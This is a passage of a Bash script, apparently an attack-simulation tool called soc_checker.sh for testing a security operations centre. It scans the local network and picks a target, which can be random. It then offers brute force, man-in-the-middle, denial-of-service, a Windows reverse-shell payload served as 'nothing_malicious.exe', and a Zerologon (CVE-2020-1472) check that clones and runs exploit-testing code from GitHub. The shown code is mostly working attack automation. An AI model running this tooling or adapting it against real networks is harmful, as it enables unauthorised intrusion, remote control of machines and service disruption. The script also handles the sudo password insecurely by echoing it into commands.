		echo -e "\033[1m\nStarting web server...\033[0m"
		echo -e "\033[1m\tWeb Server\033[0m: $(sudo service apache2 status | head -n 1 | awk -F- '{print $2}' | sed 's/^ //g')"
		echo -e "\033[1m\tWeb Server Status\033[0m: $(echo $status | awk '{print $2,$3}')"
		echo -e "\033[1m\n\tMalicious URL\033[0m: http://$host_ip/nothing_malicious.exe"
		handler
	}
	echo "Checking... Please wait."
	if [ "$(which msfconsole)" = "/usr/bin/msfconsole" ]			# check if metasploit is installed
		then
			:
		else
			echo $pass | sudo -S apt-get install metasploit-framework -y
	fi
	if [ "$(which gnome-terminal)" = "/usr/bin/gnome-terminal" ]	# check if gnome-terminal is installed
	then
		:
	else
		echo $pass | sudo -S apt-get install gnome-terminal -y #1>/dev/null
	fi
	echo $pass | sudo -S updatedb 1>/dev/null
	tput reset		# reverse shell menu
	host_ip=$(ifconfig | grep -w 'inet.*broadcast' | awk '{print $2}')
	echo -e "\033[1m\e[4mReverse Shell (Target: Windows OS)\033[0m\e[0m"
	echo -e "Reverse shell is a process used to gain access to remote systems (Windows) and exploit remote code\nexecution (RCE) vulnerabilities present in these systems."
	echo -e "To use: It will create a payload that will be attached to your web server.\nIt will then listen and wait for victim."
	echo "Victim will downloaded the payload and upon executing it; you will gain access to that remote system."
	echo -e "\033[1m\nTarget IP\033[0m: $IP \n"
	while true ;do
	if [ "$choice" = "r" ];then
		choose_1="y"
	else
		read -p "soc_checker.sh will create a reverse TCP shell payload. Continue? (Y/n) " choose_1
	fi
		case $choose_1 in
			y|yes|Yes) reverse_payload;;
			n|no|No|nO|b) start_menu
						break;;
			*) 	if [ -z "$choose_1" ]
				then
					reverse_payload
					break
				else
					:
				fi ;;
		esac
	done
}
function zero_logon_attack(){	# Zero Logon Attack
	function zero_logon_test(){		# initiate setup for logon test
		rm -rf /tmp/dc_scan.txt &>/dev/null
		rm -rf /tmp/dc_test.txt &>/dev/null
		echo $pass | sudo -S rm -rf CVE-2020-1472 &>/dev/null
		echo "Checking... Please wait."
		if [ "$(which nbtscan)" = "/usr/bin/nbtscan" ]		# check if nbtscan is installed
		then
			:
		else
			echo $pass | sudo -S apt-get install nbtscan -y #1>/dev/null
		fi
		if [ "$(which nmap)" = "/usr/bin/nmap" ]
		then
			:
		else
			echo $pass | sudo -S apt-get install nmap -y 1>/dev/null
		fi
		echo $pass | sudo -S updatedb #1>/dev/null 
		tput reset
		echo "Scanning... Please wait."
		echo $pass | sudo -S nmap $IP -sV -v -T4 > /tmp/dc_scan.txt
		domain=$(cat /tmp/dc_scan.txt | grep -o .*.local | awk '{print $NF}' | uniq | head -n 1)
		net_name=$(nbtscan -r $IP | tail -n 1 | awk '{print $2}')

		if [ -z "$domain" ];then							# check if target machine is a DC Controller
			domain="-N.A-"
			echo -e "\033[1m\nTarget IP\033[0m: $IP"
			echo -e "\033[1mDomain Name\033[0m: $domain"
			echo -e "\033[1mNetBIOS Name\033[0m: $net_name\n"
			echo -e "\033[1m\e[4m\n$(date "+%a %b %d %T %p") [Zero Logon] Initiating Zero Logon Test on $IP.\033[0m\e[0m" >> soc_checker_results.txt
			echo -e "\t\033[1m[Failed] Target machine ($IP) is not a Domain Controller.\n\tPlease conduct testing on a Domain Controller.\033[0m" | tee -a soc_checker_results.txt
			logger "[Zero Logon]: Target machine ($IP) is not a Domain Controller. (Failed)"
			echo -e "\nPress Enter to continue." && read -r
		else
			if [ "$(which python)" = "/usr/bin/python" ]		# check if python is installed
			then
				:
			else
				echo $pass | sudo -S apt-get install python3 -y #1>/dev/null
			fi
			if [ "$(which pip)" = "/usr/bin/pip" ]				# check if pip3 is installed
				then
					:
				else
					echo $pass | sudo -S apt-get install python3-pip -y #1>/dev/null
			fi
			if [ "$(which git)" = "/usr/bin/git" ]				# check if git is installed
			then
				:
			else
				echo $pass | sudo -S apt-get install git -y 1>/dev/null
			fi
			echo $pass | sudo -S updatedb 1>/dev/null && tput reset
			echo -e "\033[1m\nTarget IP\033[0m: $IP"
			echo -e "\033[1mDomain Name\033[0m: $domain"
			echo -e "\033[1mNetBIOS Name\033[0m: $net_name\n"												# https://github.com/SecuraBV/CVE-2020-1472
			echo $pass | sudo -S git clone https://github.com/SecuraBV/CVE-2020-1472.git 
			cd CVE-2020-1472
			pip3 install -r requirements.txt	1>/dev/null
			echo -e "\033[1m\n[Initiating Zero Logon Test on $IP]\033[0m"
			python3 zerologon_tester.py $net_name $IP > /tmp/dc_test.txt
			logger "[Zero Logon]: Initiating Zero Logon Test on $IP. (Complete)"
			status=$(cat /tmp/dc_test.txt | tail -n 1)
			echo -e "\033[1m\e[4m\n$(date "+%a %b %d %T %p") [Zero Logon] Initiating Zero Logon Test on $IP.\033[0m\e[0m" >> ../soc_checker_results.txt
			echo -e "\033[1m\n\tResult: $status\033[0m"	| tee -a ../soc_checker_results.txt	# result of zero logon test
			if [ -z "$(echo $status | grep -w "failed.")" ] ;then
				logger "[Zero Logon]: Zero Logon Attack on $IP. (Successful Attack)"
				echo "To exploit further; please visit 'https://github.com/risksense/zerologon' for more details."
			else
				logger "[Zero Logon]: Zero Logon Attack on $IP. (Attack Failed)"
			fi
			echo $pass | sudo -S apt-get remove --purge impacket-scripts python3-impacket &>/dev/null
			cd ..	
			echo $pass | sudo -S rm -rf CVE-2020-1472 &>/dev/null
			rm -rf /tmp/dc_scan.txt &>/dev/null
			rm -rf /tmp/dc_test.txt &>/dev/null
			echo -e "\nPress Enter to continue." && read -r
		fi
	}
	tput reset
	if [ "$choice" = "r" ];then			# for random attack
			zero_logon_test
	else								# proceed to set connection
		echo -e "\033[1m\e[4mZero Logon Domain Controller Test (CVE-2020-1472)\033[0m\e[0m"
		echo -e "Zerologon is a vulnerability in Microsoft's Netlogon process that attack against Microsoft Active Directory domain controllers (CVE-2020-1472).\nIt makes it possible for an attacker to impersonate any computer, including the root domain controller."
		echo -e "This script will test the Netlogon authentication bypass. It will immediately terminate when successfully performing the bypass, and will not perform any Netlogon operations."
		echo -e "\nWhen a domain controller is patched, the detection script will give up after sending 2000 pairs of RPC calls and conclude the target is not vulnerable.\n"
		echo "To exploit further after successful test; please visit 'https://github.com/risksense/zerologon' for more details."
		echo -e "\033[1m\nTarget IP\033[0m: $IP \n"
		while true ;do
			read -p "Proceed test on Domain Controller ($IP)? (Y/n) " chosen
			if [ "$chosen" = "y" ] || [ "$chosen" = "yes" ] || [ -z "$chosen" ];then
				zero_logon_test && break
			elif [ "$chosen" = "n" ] || [ "$chosen" = "no" ];then
				echo $pass | sudo -S apt-get remove --purge impacket-scripts python3-impacket &>/dev/null
				cd ..	
				echo $pass | sudo -S rm -rf CVE-2020-1472 &>/dev/null
				rm -rf /tmp/dc_scan.txt &>/dev/null
				rm -rf /tmp/dc_test.txt &>/dev/null
				start_menu && break			# go back to start menu
			else
				:
			fi
		done
	fi
}
function random_function(){		# for Random Output
	number=$(echo $1 | wc -w)
	random_num=$(( RANDOM % number + 1 ))
	echo $1 | cut -d " " -f $random_num
}
function random_IP(){			# selecting Random IP
	list_ips=$(cat /tmp/local.net | grep -v Interface | grep -v Network | grep -v Run | awk '{print$1}')
	host=$(cat /tmp/local.net | grep -w Interface | awk '{print $NF}')
	gate=$(route -n | grep UG | tr -d '\s' | awk '{print $2}')
	for i in $list_ips ;do		# list of IPs detected excluding host and gateway
		if [ "$i" = "$host" ] || [ "$i" = "$gate" ];then
			:
		else
			victims="$victims $i"
		fi
	done
	if [ -z	"$victims" ];then	# if no target IPs
			echo -e "\nOnly 2 IP Addresses detected.\nHost IP Address: $host\nGateway IP Address: $gate\n\n\t\033[1mUnable to specify a target.\033[0m"
			logger "[Stop soc_checker.sh] Only 2 IP Addresses detected. Host: $host\nGateway: $gate. Unable to specify target."
			quit_soc
		else					# if target IPs is available
			IP=$(random_function "$victims")
	fi
}
function start_menu(){			# Main Menu of program
	while true					# List out the Attack Options
	do
	tput reset && cat /tmp/local.net && echo "" 
	echo -e "\t\033[1m\e[4mAttack options\033[0m\e[0m"
	echo -e "\t\033[1m[1] Nmap Scan \033[0m  (Discover and map network devices and services)"
	echo -e "\t\033[1m[2] Brute-force Login Credentials \033[0m  (Guessing login credentials repeatedly)"
	echo -e "\t\033[1m[3] Man-in-the-Middle Attack \033[0m  (Intercepting communication between two points)"
	echo -e "\t\033[1m[4] Denial-of-Service Attack \033[0m  (Flooding network or system to disrupt service)"
	echo -e "\t\033[1m[5] Reverse Shell (Target: Windows OS)\033[0m  (Infiltrating a target system via Malicious Payload)"
	echo -e "\t\033[1m[6] Zero Logon Attack Test on Domain Controller \033[0m  (Testing a vulnerability CVE-2020-1472)"
	echo -e "\t\033[1m[7] View Result\033[0m"
	echo -e "\t\033[1m[8] Change Target IP Address\033[0m"
	echo -e "\t\033[1m[9] Quit program\033[0m"
	echo -e "\t\033[1m[r] Random Attack\033[0m\n"
								# Navigate to the options selected by user
	read -p "Choose your attack option (To quit, enter \"q\"): " choice
		case $choice in
			1) 	nmap_scan;;
			2) 	brute_force;;
			3) 	mitm;;
			4) 	dos_attack;;
			5) 	reverse_shell;;
			6)	zero_logon_attack;;
			7) 	if [ -f "$(pwd)/soc_checker_results.txt" ];then cat $(pwd)/soc_checker_results.txt; echo -e "\nPress Enter to continue." && read -r
				else echo -e "\n\t\t\033[1mResult not available.\033[0m";echo -e "\nPress Enter to continue." && read -r;fi;;
			8|b) echo "Restarting..."
				IP="" && list_ips="" && victims=""
				logger "[Restart soc_checker.sh]: Program Restarted."
				rm -r /tmp/local.net &>/dev/null
				start;;
			9|quit|q) quit_soc ;;
			r)	output=$(random_function "nmap_scan brute_force mitm dos_attack reverse_shell zero_logon_attack")	# for random attack
				$output
				;;
			*) if [ -z "$choice" ]
				then
					:
				else
					echo "Please enter the attack option. To quit, enter \"q\" or \"quit\"."
					continue
				fi ;;
		esac
	done
}
function start(){				# start up
	logger "[Run soc_checker.sh]: Program Started."
	if [ "$(which arp-scan)" = "/usr/sbin/arp-scan" ]			# check if arp-scan is installed
	then
		:
	else
		sudo apt-get install arp-scan -y 1>/dev/null
	fi
	echo $pass | sudo -S updatedb #&>/dev/null					# discover IP addresses in the local network
	tput reset && echo -e "\033[1m[Running soc_checker.sh]\033[0m\n\033[1m\e[4mLocal Network Information\033[0m\e[0m:" > /tmp/local.net
	sudo arp-scan --localnet --numeric --ignoredups | grep -E '([a-f0-9]{2}:){5}[a-f0-9]{2}' | awk '{print $0}' >> /tmp/local.net
	logger "[Start soc_checker.sh]: ARP-Scan on host Local Area Network (Complete)"
	cat /tmp/local.net && echo ""								# display IP addresses in the local network
	host=$(cat /tmp/local.net | grep -w Interface | awk '{print $NF}')
	gate=$(route -n | grep UG | tr -d '\s' | awk '{print $2}')	# identify the host and gateway in the local network
	echo "Host IP Address: $host"
	echo -e "Gateway IP Address: $gate \n"
	while [[ ! -n "$(echo $IP | egrep '^[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}$')" ]];do
		echo "For Random target, enter \"r\"."
		read -p "Specify the IP Address of Target (e.g. 192.168.200.20): " IP
		if [ "$IP" = "r" ];then
			random_IP
			break
		fi
	done
	echo -e "\nHost IP Address: $host" >> /tmp/local.net
	echo -e "Gateway IP Address: $gate" >> /tmp/local.net
	echo -e "\n     Target IP: \033[1m$IP\033[0m" >> /tmp/local.net
	start_menu
}

trap "trap_all" 2
#sudo timedatectl set-timezone Asia/Singapore		# set to correct timezone (optional)
read -p "[sudo] password for script: " -s pass && echo ""
sudo echo "Checking... Please wait."

echo '* libraries/restart-without-asking boolean true' | sudo debconf-set-selections 	# for non-interactive of library installation
#~ export debian_frontend=noninteractive													# for non-interactive of package installation
#~ yes | sudo debian_frontend=noninteractive apt-get -yqq purge postgresql*
echo $pass | sudo -S apt-get update
#~ echo $pass | sudo -S apt-get upgrade -y
#~ echo $pass | sudo -S apt-get -f install
#~ yes | sudo DEBIAN_FRONTEND=noninteractive apt-get -yqq install postgresql
#~ echo $pass | sudo -S apt-get autoremove -y
#~ echo $pass | sudo -S apt-get autoclean
start

